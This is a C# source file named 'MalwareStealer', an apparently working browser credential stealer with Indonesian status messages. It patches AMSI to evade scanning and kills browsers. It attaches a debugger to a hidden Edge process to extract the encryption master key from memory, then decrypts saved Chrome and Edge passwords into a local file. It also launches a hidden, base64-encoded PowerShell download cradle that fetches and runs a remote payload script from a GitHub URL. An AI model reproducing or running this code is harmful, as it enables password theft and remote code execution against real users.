using System;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;
using System.Data.SQLite;
using System.Security.Cryptography;
using System.Diagnostics;
using System.Threading;
using System.Net;
using System.Reflection;

namespace MalwareStealer
{
    class Program
    {
        // ===== WINDOWS API =====
        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);
        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        static extern bool CreateProcessW(
            string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
            IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
        );

        [DllImport("kernel32.dll")]
        static extern bool DebugActiveProcess(int dwProcessId);
        [DllImport("kernel32.dll")]
        static extern bool WaitForDebugEvent(out DEBUG_EVENT lpDebugEvent, uint dwMilliseconds);
        [DllImport("kernel32.dll")]
        static extern bool ContinueDebugEvent(uint dwProcessId, uint dwThreadId, uint dwContinueStatus);
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        [DllImport("kernel32.dll")]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        [DllImport("kernel32.dll")]
        static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);
        [DllImport("kernel32.dll")]
        static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);
        [DllImport("kernel32.dll")]
        static extern int ResumeThread(IntPtr hThread);
        [DllImport("kernel32.dll")]
        static extern bool DebugSetProcessKillOnExit(bool KillOnExit);
        [DllImport("kernel32.dll")]
        static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

        // ===== STRUCTS =====
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public int cb; public string lpReserved; public string lpDesktop; public string lpTitle;
            public int dwX; public int dwY; public int dwXSize; public int dwYSize;
            public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute;
            public int dwFlags; public short wShowWindow; public short cbReserved2;
            public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct DEBUG_EVENT
        {
            public int dwDebugEventCode; public int dwProcessId; public int dwThreadId;
            public int dwFlags;
            public int dwExceptionCode;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CONTEXT
        {
            public uint ContextFlags; public uint Dr0; public uint Dr1; public uint Dr2; public uint Dr3;
            public uint Dr6; public uint Dr7; public uint FloatSave; public uint SegGs; public uint SegFs;
            public uint SegEs; public uint SegDs; public uint Edi; public uint Esi; public uint Ebx;
            public uint Edx; public uint Ecx; public uint Eax; public uint Ebp; public uint Eip;
            public uint SegCs; public uint EFlags; public uint Esp; public uint SegSs;
            public ulong R14; public ulong R15;
        }

        // ===== CONSTANTS =====
        const uint CREATE_SUSPENDED = 0x00000004;
        const uint SW_HIDE = 0;
        const uint PROCESS_VM_READ = 0x0010;
        const uint PROCESS_QUERY_INFORMATION = 0x0400;
        const uint THREAD_SET_CONTEXT = 0x0010;
        const uint THREAD_GET_CONTEXT = 0x0008;
        const uint CONTEXT_FULL = 0x100000;
        const uint DBG_CONTINUE = 0x00010002;
        const int LOAD_DLL_DEBUG_EVENT = 6;
        const int EXCEPTION_DEBUG_EVENT = 1;
        const uint EXCEPTION_SINGLE_STEP = 0x80000004;

        // ===== EMBED DLL RESOLVER =====
        static void SetupDLLResolver()
        {
            AppDomain.CurrentDomain.AssemblyResolve += (sender, args) =>
            {
                string assemblyName = new AssemblyName(args.Name).Name;
                if (assemblyName == "System.Data.SQLite")
                {
                    string dllPath = Path.Combine(Path.GetTempPath(), "System.Data.SQLite.dll");
                    
                    // CEK APAKAH DLL SUDAH ADA
                    if (!File.Exists(dllPath))
                    {
                        try
                        {
                            Console.WriteLine("[+] Downloading System.Data.SQLite.dll from GitHub...");
                            using (var client = new WebClient())
                            {
                                client.DownloadFile("https://raw.githubusercontent.com/dailam008/stealer/main/System.Data.SQLite.dll", dllPath);
                            }
                            Console.WriteLine("[+] Download complete: " + dllPath);
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("[-] Failed to download DLL: " + ex.Message);
                            return null;
                        }
                    }
                    
                    try
                    {
                        byte[] assemblyBytes = File.ReadAllBytes(dllPath);
                        return Assembly.Load(assemblyBytes);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[-] Failed to load DLL: " + ex.Message);
                        return null;
                    }
                }
                return null;
            };
        }

        // ===== AMSI BYPASS =====
        static void BypassAMSI()
        {
            try
            {
                IntPtr amsi = LoadLibrary("amsi.dll");
                IntPtr amsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
                uint oldProtect;
                VirtualProtect(amsiScanBuffer, 6, 0x40, out oldProtect);
                Marshal.WriteByte(amsiScanBuffer, 0, 0x31);
                Marshal.WriteByte(amsiScanBuffer, 1, 0xC0);
                Marshal.WriteByte(amsiScanBuffer, 2, 0xC3);
                Console.WriteLine("[+] AMSI Bypassed!");
            }
            catch { Console.WriteLine("[-] AMSI Bypass Failed!"); }
        }

        // ===== KILL BROWSER =====
        static void KillBrowsers()
        {
            Console.WriteLine("[+] Menutup browser...");
            string[] browsers = { "msedge", "chrome", "brave" };
            foreach (string name in browsers)
            {
                try
                {
                    foreach (Process p in Process.GetProcessesByName(name))
                    {
                        p.Kill();
                        p.WaitForExit(2000);
                    }
                }
                catch { }
            }
            Thread.Sleep(2000);
        }

        // ===== SCAN MEMORY =====
        static IntPtr FindStringInModule(IntPtr hProcess, IntPtr moduleBase, int moduleSize, string target)
        {
            byte[] buffer = new byte[moduleSize];
            IntPtr bytesRead;
            if (!ReadProcessMemory(hProcess, moduleBase, buffer, moduleSize, out bytesRead))
                return IntPtr.Zero;

            byte[] targetBytes = Encoding.ASCII.GetBytes(target);
            for (int i = 0; i < buffer.Length - targetBytes.Length; i++)
            {
                bool found = true;
                for (int j = 0; j < targetBytes.Length; j++)
                {
                    if (buffer[i + j] != targetBytes[j]) { found = false; break; }
                }
                if (found)
                    return (IntPtr)((long)moduleBase + i);
            }
            return IntPtr.Zero;
        }

        // ===== SCAN .TEXT =====
        static IntPtr FindLEAByScan(IntPtr hProcess, IntPtr textBase, int textSize, IntPtr targetAddr)
        {
            byte[] buffer = new byte[textSize];
            IntPtr bytesRead;
            if (!ReadProcessMemory(hProcess, textBase, buffer, textSize, out bytesRead))
                return IntPtr.Zero;

            for (int i = 0; i < buffer.Length - 7; i++)
            {
                if (buffer[i] == 0x48 && buffer[i + 1] == 0x8D && buffer[i + 2] == 0x0D)
                {
                    int displacement = BitConverter.ToInt32(buffer, i + 3);
                    IntPtr calcAddr = (IntPtr)((long)textBase + i + 7 + displacement);
                    if (calcAddr == targetAddr)
                        return (IntPtr)((long)textBase + i);
                }
            }
            return IntPtr.Zero;
        }

        // ===== GET MASTER KEY VIA DEBUGGER =====
        static byte[] ExtractMasterKeyViaDebugger()
        {
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            try
            {
                Console.WriteLine("[+] Menjalankan Debugger...");

                STARTUPINFO si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
                si.dwFlags = 0x00000001;
                si.wShowWindow = (short)SW_HIDE;

                bool success = CreateProcessW(
                    @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                    " --headless --disable-gpu", IntPtr.Zero, IntPtr.Zero, false,
                    CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi
                );

                if (!success) return null;
                Console.WriteLine("[+] Edge Spawned (PID: " + pi.dwProcessId + ")");

                ResumeThread(pi.hThread);
                DebugActiveProcess(pi.dwProcessId);
                DebugSetProcessKillOnExit(false);

                IntPtr hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pi.dwProcessId);
                if (hProcess == IntPtr.Zero) return null;

                IntPtr msedgeBase = IntPtr.Zero;
                for (int i = 0; i < 50; i++)
                {
                    msedgeBase = GetModuleBaseAddress(pi.dwProcessId, "msedge.dll");
                    if (msedgeBase != IntPtr.Zero) break;
                    Thread.Sleep(100);
                }

                if (msedgeBase == IntPtr.Zero)
                {
                    Console.WriteLine("[-] msedge.dll not found");
                    return null;
                }
                Console.WriteLine("[+] msedge.dll base: 0x" + msedgeBase.ToString("X"));

                string targetString = "OSCrypt.AppBoundProvider.Decrypt.ResultCode";
                IntPtr stringAddr = FindStringInModule(hProcess, msedgeBase, 0x1000000, targetString);
                if (stringAddr == IntPtr.Zero)
                {
                    Console.WriteLine("[-] String target tidak ditemukan");
                    return null;
                }
                Console.WriteLine("[+] String ditemukan di: 0x" + stringAddr.ToString("X"));

                IntPtr leaAddr = FindLEAByScan(hProcess, msedgeBase, 0x1000000, stringAddr);
                if (leaAddr == IntPtr.Zero)
                {
                    Console.WriteLine("[-] LEA tidak ditemukan");
                    return null;
                }
                Console.WriteLine("[+] LEA ditemukan di: 0x" + leaAddr.ToString("X"));

                IntPtr hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, false, (uint)pi.dwThreadId);
                if (hThread == IntPtr.Zero) return null;

                CONTEXT ctx = new CONTEXT();
                ctx.ContextFlags = CONTEXT_FULL;
                GetThreadContext(hThread, ref ctx);

                ctx.Dr0 = (uint)leaAddr.ToInt64();
                ctx.Dr7 = 0x1;
                SetThreadContext(hThread, ref ctx);
                CloseHandle(hThread);

                Console.WriteLine("[+] Hardware breakpoint dipasang di: 0x" + leaAddr.ToString("X"));

                DEBUG_EVENT de;
                int timeout = 30000;
                int elapsed = 0;
                byte[] key = null;

                while (elapsed < timeout)
                {
                    if (!WaitForDebugEvent(out de, 1000))
                    {
                        elapsed += 1000;
                        continue;
                    }

                    if (de.dwDebugEventCode == EXCEPTION_DEBUG_EVENT)
                    {
                        hThread = OpenThread(THREAD_GET_CONTEXT, false, (uint)de.dwThreadId);
                        ctx = new CONTEXT();
                        ctx.ContextFlags = CONTEXT_FULL;
                        GetThreadContext(hThread, ref ctx);

                        IntPtr keyPtr = (IntPtr)ctx.R14;
                        key = new byte[32];
                        IntPtr bytesRead;
                        if (ReadProcessMemory(hProcess, keyPtr, key, 32, out bytesRead))
                        {
                            Console.WriteLine("[+] Master key berhasil diekstrak via debugger!");
                            CloseHandle(hThread);
                            break;
                        }
                        CloseHandle(hThread);
                    }

                    ContinueDebugEvent((uint)de.dwProcessId, (uint)de.dwThreadId, DBG_CONTINUE);
                    elapsed += 1000;
                }

                TerminateProcess(pi.hProcess, 0);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                CloseHandle(hProcess);

                return key;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Error di debugger: " + ex.Message);
                return null;
            }
            finally
            {
                if (pi.hProcess != IntPtr.Zero)
                {
                    TerminateProcess(pi.hProcess, 0);
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
            }
        }

        // ===== HELPER FUNCTIONS =====
        static IntPtr GetModuleBaseAddress(int processId, string moduleName)
        {
            try
            {
                Process process = Process.GetProcessById(processId);
                foreach (ProcessModule module in process.Modules)
                {
                    if (module.ModuleName.Equals(moduleName, StringComparison.OrdinalIgnoreCase))
                        return module.BaseAddress;
                }
            }
            catch { }
            return IntPtr.Zero;
        }

        // ===== DECRYPT AES-GCM =====
        static string DecryptPasswordAES(byte[] encrypted, byte[] masterKey)
        {
            if (encrypted == null || encrypted.Length < 28 || masterKey == null)
                return "[[ENCRYPTED]]";

            try
            {
                byte[] nonce = new byte[12];
                byte[] ciphertext = new byte[encrypted.Length - 12 - 16];
                byte[] tag = new byte[16];

                Array.Copy(encrypted, 0, nonce, 0, 12);
                Array.Copy(encrypted, 12, ciphertext, 0, ciphertext.Length);
                Array.Copy(encrypted, encrypted.Length - 16, tag, 0, 16);

                var cipher = new Org.BouncyCastle.Crypto.Modes.GcmBlockCipher(
                    new Org.BouncyCastle.Crypto.Engines.AesEngine()
                );
                var parameters = new Org.BouncyCastle.Crypto.Parameters.AeadParameters(
                    new Org.BouncyCastle.Crypto.Parameters.KeyParameter(masterKey),
                    128,
                    nonce
                );
                cipher.Init(false, parameters);

                byte[] plaintext = new byte[cipher.GetOutputSize(ciphertext.Length)];
                int len = cipher.ProcessBytes(ciphertext, 0, ciphertext.Length, plaintext, 0);
                cipher.DoFinal(plaintext, len);

                return Encoding.UTF8.GetString(plaintext).TrimEnd('\0');
            }
            catch { return "[[DECRYPT FAILED]]"; }
        }

        // ===== MODUL 4: FILELESS EXECUTION =====
        static void ExecuteDownloadCradle(string url)
        {
            try
            {
                Console.WriteLine("[+] Menjalankan Download Cradle...");
                
                string cradle = string.Format(
                    "IEX (Invoke-WebRequest -Uri '{0}').Content",
                    url
                );
                
                byte[] bytes = Encoding.Unicode.GetBytes(cradle);
                string encoded = Convert.ToBase64String(bytes);
                
                string psCommand = string.Format(
                    "powershell -nop -w hidden -enc {0}",
                    encoded
                );
                
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "powershell.exe";
                psi.Arguments = psCommand;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.RedirectStandardOutput = true;
                
                Process p = Process.Start(psi);
                p.WaitForExit(5000);
                
                string output = p.StandardOutput.ReadToEnd();
                Console.WriteLine("[+] Download Cradle selesai.");
                if (!string.IsNullOrEmpty(output))
                {
                    string[] lines = output.Trim().Split('\n');
                    foreach (string line in lines)
                    {
                        if (!string.IsNullOrEmpty(line.Trim()))
                            Console.WriteLine("[+] Output: " + line.Trim());
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Error: " + ex.Message);
                try
                {
                    Console.WriteLine("[+] Mencoba fallback WebClient...");
                    string cradle = string.Format(
                        "IEX (New-Object Net.WebClient).DownloadString('{0}')",
                        url
                    );
                    byte[] bytes = Encoding.Unicode.GetBytes(cradle);
                    string encoded = Convert.ToBase64String(bytes);
                    
                    string psCommand = string.Format(
                        "powershell -nop -w hidden -enc {0}",
                        encoded
                    );
                    
                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = "powershell.exe";
                    psi.Arguments = psCommand;
                    psi.UseShellExecute = false;
                    psi.CreateNoWindow = true;
                    psi.RedirectStandardOutput = true;
                    
                    Process p = Process.Start(psi);
                    p.WaitForExit(5000);
                    
                    string output = p.StandardOutput.ReadToEnd();
                    Console.WriteLine("[+] Fallback selesai.");
                    if (!string.IsNullOrEmpty(output))
                    {
                        string[] lines = output.Trim().Split('\n');
                        foreach (string line in lines)
                        {
                            if (!string.IsNullOrEmpty(line.Trim()))
                                Console.WriteLine("[+] Output: " + line.Trim());
                        }
                    }
                }
                catch (Exception ex2)
                {
                    Console.WriteLine("[-] Fallback gagal: " + ex2.Message);
                }
            }
        }

        static void ExecuteObfuscated()
        {
            try
            {
                Console.WriteLine("[+] Menjalankan Obfuscated Execution...");
                
                string encoded = "d2hvYW1p";
                string command = string.Format(
                    "powershell -nop -c \"IEX ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('{0}')))\"",
                    encoded
                );
                
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "powershell.exe";
                psi.Arguments = command;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.RedirectStandardOutput = true;
                
                Process p = Process.Start(psi);
                p.WaitForExit(5000);
                
                string output = p.StandardOutput.ReadToEnd();
                Console.WriteLine("[+] Output: " + output.Trim());
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Error: " + ex.Message);
            }
        }

        // ===== DUMP DATA =====
        static void DumpData(byte[] masterKey)
        {
            try
            {
                Directory.CreateDirectory(@"C:\Stealer");
                Console.WriteLine("[+] Folder C:\\Stealer berhasil dibuat.");
            }
            catch
            {
                try
                {
                    Directory.CreateDirectory(Path.Combine(Path.GetTempPath(), "Stealer"));
                    Console.WriteLine("[+] Folder %TEMP%\\Stealer berhasil dibuat.");
                }
                catch
                {
                    Console.WriteLine("[-] Gagal buat folder di C:\\ dan %TEMP%.");
                }
            }

            string output = Path.Combine(Path.GetTempPath(), "Stealer", "stolen_data.txt");
            
            if (Directory.Exists(@"C:\Stealer"))
            {
                output = @"C:\Stealer\stolen_data.txt";
                Console.WriteLine("[+] Output di C:\\Stealer\\stolen_data.txt");
            }
            else
            {
                Console.WriteLine("[+] Output di %TEMP%\\Stealer\\stolen_data.txt");
            }

            StringBuilder sb = new StringBuilder();
            sb.AppendLine("=== BROWSER STEALER ===");
            sb.AppendLine("Time: " + DateTime.Now.ToString());
            sb.AppendLine("User: " + Environment.UserName);
            sb.AppendLine("");

            string[] browsers = {
                @"Microsoft\Edge\User Data\Default\Login Data",
                @"Google\Chrome\User Data\Default\Login Data"
            };

            foreach (string browser in browsers)
            {
                string path = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    browser
                );
                if (!File.Exists(path)) continue;

                sb.AppendLine("[+] PASSWORD FROM " + browser);
                string temp = Path.GetTempFileName();

                try
                {
                    File.Copy(path, temp, true);
                    var conn = new SQLiteConnection("Data Source=" + temp + ";Version=3;Read Only=True;");
                    conn.Open();
                    var cmd = conn.CreateCommand();
                    cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins";
                    var reader = cmd.ExecuteReader();

                    while (reader.Read())
                    {
                        string url = reader.GetString(0);
                        string user = reader.GetString(1);
                        byte[] passBytes = (byte[])reader.GetValue(2);
                        string pass = "[[ENCRYPTED]]";

                        if (masterKey != null && passBytes != null && passBytes.Length >= 28)
                        {
                            pass = DecryptPasswordAES(passBytes, masterKey);
                        }

                        if (pass == "[[ENCRYPTED]]" || pass == "[[DECRYPT FAILED]]")
                        {
                            try
                            {
                                byte[] decrypted = ProtectedData.Unprotect(passBytes, null, DataProtectionScope.CurrentUser);
                                pass = Encoding.UTF8.GetString(decrypted);
                            }
                            catch { }
                        }

                        if (pass == "[[ENCRYPTED]]" || pass == "[[DECRYPT FAILED]]")
                        {
                            try
                            {
                                using (SHA256 sha256 = SHA256.Create())
                                {
                                    byte[] hashBytes = sha256.ComputeHash(passBytes);
                                    pass = "HASH: " + BitConverter.ToString(hashBytes).Replace("-", "").ToLower();
                                }
                            }
                            catch { pass = "[[HASH FAILED]]"; }
                        }

                        sb.AppendLine("  URL: " + url);
                        sb.AppendLine("  User: " + user);
                        sb.AppendLine("  Pass: " + pass);
                        sb.AppendLine("");
                    }
                    conn.Close();
                }
                catch (Exception ex) { sb.AppendLine("  [!] Error: " + ex.Message); }
                try { File.Delete(temp); } catch { }
            }

            try
            {
                Directory.CreateDirectory(Path.GetDirectoryName(output));
                File.WriteAllText(output, sb.ToString());
                Console.WriteLine("[+] Data saved to " + output);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Gagal simpan: " + ex.Message);
            }

            Console.WriteLine("[+] Press any key to exit...");
            Console.ReadKey();
        }

        // ===== MAIN =====
        static void Main()
        {
            SetupDLLResolver();
            DumpData(null);

            BypassAMSI();
            Console.WriteLine("[+] Malware Stealer Aktif!");
            Console.WriteLine("[+] Modul 4: Fileless Execution");
            
            string githubUrl = "https://raw.githubusercontent.com/dailam008/stealer/main/payload.ps1";
            ExecuteDownloadCradle(githubUrl);
            ExecuteObfuscated();
            
            byte[] masterKey = null;
            Console.WriteLine("[+] Mencoba debugger bypass...");
            masterKey = ExtractMasterKeyViaDebugger();

            if (masterKey == null)
            {
                Console.WriteLine("[+] Debugger gagal, mencoba kill browser + DPAPI...");
                KillBrowsers();
                masterKey = null;
            }

            if (masterKey != null)
            {
                Console.WriteLine("[+] Master Key Didapat! Password akan didekripsi.");
            }
            else
            {
                Console.WriteLine("[-] Gagal Dapat Master Key. Menggunakan hash fallback.");
            }

            DumpData(masterKey);
        }
    }
}
